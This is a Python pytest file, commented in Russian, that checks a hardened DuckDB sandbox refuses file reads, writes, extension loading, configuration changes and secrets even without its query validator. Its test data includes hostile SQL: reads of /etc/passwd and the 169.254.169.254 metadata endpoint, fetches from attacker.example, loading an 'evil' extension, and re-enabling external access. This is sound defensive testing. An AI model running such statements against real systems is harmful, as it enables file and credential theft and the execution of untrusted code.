"""Граница исполнения: что делает движок, если валидатора нет вовсе.

Все проверки этого файла обращаются к соединению **напрямую**, минуя `validate_query`
и `parse_query`. Смысл ровно в этом: показать, что запрет держится не на разборе текста,
а на самом движке. Если завтра валидатор ошибётся, пропустит незнакомую конструкцию или
будет случайно отключён, перечисленное ниже всё равно не выполнится.

Разделение существенно. Ниже отдельно перечислено то, что движок закрывает сам, и то,
что он **не** закрывает, — второе держится только на валидаторе, и это записано честно,
а не спрятано. Список второй категории проверяется тем же способом: если движок однажды
начнёт закрывать что-то из неё, тест об этом скажет.
"""

from __future__ import annotations

from collections.abc import Iterator
from pathlib import Path

import duckdb
import polars as pl
import pytest

from backend.adapters.engine.duckdb_session import hardened_session


@pytest.fixture(scope="module")
def workspace(tmp_path_factory: pytest.TempPathFactory) -> dict[str, Path]:
    directory = tmp_path_factory.mktemp("boundary")
    data = directory / "rows.parquet"
    pl.DataFrame({"id": [1, 2, 3], "text": ["a", "b", "c"]}).write_parquet(data)

    secret = directory / "secret.txt"
    secret.write_text("СЕКРЕТНОЕ СОДЕРЖИМОЕ", encoding="utf-8")

    secret_csv = directory / "secret.csv"
    secret_csv.write_text("a,b\n1,2\n", encoding="utf-8")

    return {"directory": directory, "data": data, "secret": secret, "secret_csv": secret_csv}


@pytest.fixture
def engine(workspace: dict[str, Path]) -> Iterator[duckdb.DuckDBPyConnection]:
    with hardened_session({"rows": workspace["data"]}) as connection:
        yield connection


def attempt(connection: duckdb.DuckDBPyConnection, statement: str) -> None:
    #ни одной проверки перед вызовом: именно так выглядел бы запрос при сломанном валидаторе
    connection.execute(statement).fetchall()


# ── чтение файловой системы ───────────────────────────────────────────────────


@pytest.mark.parametrize(
    "template",
    [
        #разные семейства читателей: текстовый разбор, структурный, сырой текст,
        #двоичное чтение. Варианты *_auto повторяют своих соседей
        "SELECT * FROM read_csv('{path}')",
        "SELECT * FROM read_json('{path}')",
        "SELECT * FROM read_text('{path}')",
        "SELECT * FROM read_blob('{path}')",
    ],
)
def test_the_engine_itself_refuses_to_read_a_real_file(
    engine: duckdb.DuckDBPyConnection, workspace: dict[str, Path], template: str
) -> None:
    """Файл существует и читаем процессом — движок всё равно отказывает.

    Проверяется настоящий файл с известным содержимым, а не выдуманный путь: отказ
    «файла нет» доказывал бы только то, что файла нет.
    """
    path = workspace["secret"].as_posix()

    with pytest.raises(duckdb.Error) as raised:
        attempt(engine, template.format(path=path))

    assert "СЕКРЕТНОЕ" not in str(raised.value)


@pytest.mark.parametrize(
    "statement",
    [
        "SELECT * FROM read_parquet('{data}')",
        "SELECT * FROM parquet_scan('{data}')",
        "SELECT * FROM parquet_metadata('{data}')",
        "SELECT * FROM parquet_schema('{data}')",
        "SELECT * FROM glob('{directory}/*')",
    ],
)
def test_the_engine_refuses_even_the_file_it_is_already_reading(
    engine: duckdb.DuckDBPyConnection, workspace: dict[str, Path], statement: str
) -> None:
    #тот же самый parquet доступен запросу как «rows», но открыть его по пути нельзя:
    #доступ даётся к связанному артефакту, а не к файловой системе
    with pytest.raises(duckdb.Error):
        attempt(
            engine,
            statement.format(
                data=workspace["data"].as_posix(), directory=workspace["directory"].as_posix()
            ),
        )


@pytest.mark.parametrize(
    "path",
    [
        "C:/Windows/win.ini",
        "/etc/passwd",
        "\\\\attacker.example\\share\\file.csv",
        "https://attacker.example/data.csv",
        "s3://bucket/data.parquet",
        "http://169.254.169.254/latest/meta-data/",
    ],
)
def test_the_engine_refuses_foreign_locations(
    engine: duckdb.DuckDBPyConnection, path: str
) -> None:
    #сюда входят и сетевые адреса: UNC-путь на Windows и http — это исходящее соединение,
    #а не чтение файла, и запрещены они тем же выключателем внешнего доступа
    with pytest.raises(duckdb.Error):
        attempt(engine, f"SELECT * FROM read_csv('{path}')")


# ── запись ────────────────────────────────────────────────────────────────────


def test_the_engine_refuses_to_write_files(
    engine: duckdb.DuckDBPyConnection, workspace: dict[str, Path]
) -> None:
    target = workspace["directory"] / "leak.csv"

    for statement in (
        f"COPY (SELECT 1) TO '{target.as_posix()}'",
        f"COPY (SELECT 1) TO '{target.as_posix()}' (FORMAT CSV)",
        f"EXPORT DATABASE '{(workspace['directory'] / 'dump').as_posix()}'",
    ):
        with pytest.raises(duckdb.Error):
            attempt(engine, statement)

    assert not target.exists(), "движок создал файл, которого не должно быть"


def test_the_engine_refuses_to_import_a_database(
    engine: duckdb.DuckDBPyConnection, workspace: dict[str, Path]
) -> None:
    with pytest.raises(duckdb.Error):
        attempt(engine, f"IMPORT DATABASE '{(workspace['directory'] / 'dump').as_posix()}'")


# ── присоединение баз и расширения ────────────────────────────────────────────


def test_the_engine_refuses_to_attach_a_file_database(
    engine: duckdb.DuckDBPyConnection, workspace: dict[str, Path]
) -> None:
    for statement in (
        f"ATTACH '{(workspace['directory'] / 'other.db').as_posix()}' AS other",
        f"ATTACH '{(workspace['directory'] / 'ro.db').as_posix()}' AS ro (READ_ONLY)",
    ):
        with pytest.raises(duckdb.Error):
            attempt(engine, statement)


@pytest.mark.parametrize(
    "statement",
    [
        #установка, установка из сети, загрузка по имени и по пути —
        #четыре разных пути внутрь движка
        "INSTALL httpfs",
        "INSTALL httpfs FROM 'https://attacker.example/'",
        "LOAD httpfs",
        "LOAD 'C:/tmp/evil.duckdb_extension'",
    ],
)
def test_the_engine_refuses_to_load_extensions(
    engine: duckdb.DuckDBPyConnection, statement: str
) -> None:
    #расширение — это исполняемый код: httpfs открыл бы сеть, и один загруженный модуль
    #обошёл бы все остальные слои сразу
    with pytest.raises(duckdb.Error):
        attempt(engine, statement)


# ── настройки и секреты ───────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "setting",
    [
        #настройки повышенного риска поимённо: внешний доступ, расширения, сам замок
        #и каталог, через который можно было бы дотянуться до файловой системы
        "enable_external_access=true",
        "allow_community_extensions=true",
        "lock_configuration=false",
        "memory_limit='100GB'",
        "home_directory='C:/'",
    ],
)
def test_the_engine_refuses_to_change_its_own_configuration(
    engine: duckdb.DuckDBPyConnection, setting: str
) -> None:
    """Настройки заперты, включая ту, что запирает остальные.

    Без этого запрос вернул бы себе внешний доступ одной строкой и обошёл бы сразу
    все прочие слои.
    """
    with pytest.raises(duckdb.Error):
        attempt(engine, f"SET {setting}")

    with pytest.raises(duckdb.Error):
        attempt(engine, f"RESET {setting.split('=', maxsplit=1)[0]}")


def test_the_engine_refuses_to_create_a_secret(engine: duckdb.DuckDBPyConnection) -> None:
    #секрет пишется в каталог пользователя и переживает процесс
    with pytest.raises(duckdb.Error):
        attempt(engine, "CREATE SECRET s (TYPE S3, KEY_ID 'k', SECRET 'v')")

    with pytest.raises(duckdb.Error):
        attempt(engine, "CREATE PERSISTENT SECRET p (TYPE S3, KEY_ID 'k', SECRET 'v')")


def test_the_engine_refuses_to_list_extensions_from_disk(
    engine: duckdb.DuckDBPyConnection,
) -> None:
    with pytest.raises(duckdb.Error):
        attempt(engine, "SELECT * FROM duckdb_extensions()")


# ── запрещённое внутри разрешённой конструкции ────────────────────────────────


@pytest.mark.parametrize(
    "template",
    [
        "SELECT * FROM (SELECT * FROM read_csv('{path}')) x",
        "WITH t AS (SELECT * FROM read_csv('{path}')) SELECT * FROM t",
        "SELECT id FROM rows UNION ALL SELECT column0 FROM read_csv('{path}')",
        "SELECT * FROM rows WHERE id IN (SELECT column0 FROM read_csv('{path}'))",
        "SELECT (SELECT count(*) FROM read_csv('{path}')) FROM rows",
    ],
)
def test_a_forbidden_source_stays_forbidden_inside_a_permitted_shape(
    engine: duckdb.DuckDBPyConnection, workspace: dict[str, Path], template: str
) -> None:
    #обёртка в подзапрос, CTE или UNION ничего не меняет: запрет держится на доступе
    #к файлу, а не на форме запроса
    with pytest.raises(duckdb.Error):
        attempt(engine, template.format(path=workspace["secret_csv"].as_posix()))


# ── что движок НЕ закрывает ───────────────────────────────────────────────────


@pytest.mark.parametrize(
    "statement",
    [
        "SELECT * FROM duckdb_settings()",
        "SELECT current_setting('temp_directory')",
        "SELECT version()",
        "PRAGMA database_list",
        "ATTACH ':memory:' AS mem",
        "CREATE TABLE evil AS SELECT 1",
        "CREATE VIEW v AS SELECT 1",
        "CREATE MACRO m(x) AS x + 1",
        "SELECT sleep_ms(1)",
    ],
)
def test_these_are_stopped_by_validation_and_not_by_the_engine(
    engine: duckdb.DuckDBPyConnection, statement: str
) -> None:
    """Честный учёт того, что песочница движка **не** закрывает.

    Перечисленное выполняется, если обратиться к соединению напрямую. Наружу оно
    не проходит только потому, что его отвергает валидатор: интроспекцию — белый список
    функций и проверка плана, создание объектов и ATTACH — проверка типа оператора.

    Тест закреплён нарочно. Он фиксирует границу ответственности слоёв и покраснеет,
    если поведение движка изменится: тогда честнее будет пересмотреть заявления
    о том, чем именно держится каждый запрет, а не оставлять их устаревшими.
    """
    attempt(engine, statement)


def test_the_engine_does_not_leak_the_workspace_through_a_registered_alias(
    engine: duckdb.DuckDBPyConnection, workspace: dict[str, Path]
) -> None:
    #связанный датасет доступен как таблица и только как таблица: пути из него не достать
    rows = engine.execute("SELECT count(*) AS n FROM rows").fetchall()

    assert rows[0][0] == 3

    with pytest.raises(duckdb.Error):
        attempt(engine, "SELECT * FROM read_parquet((SELECT 'x'))")
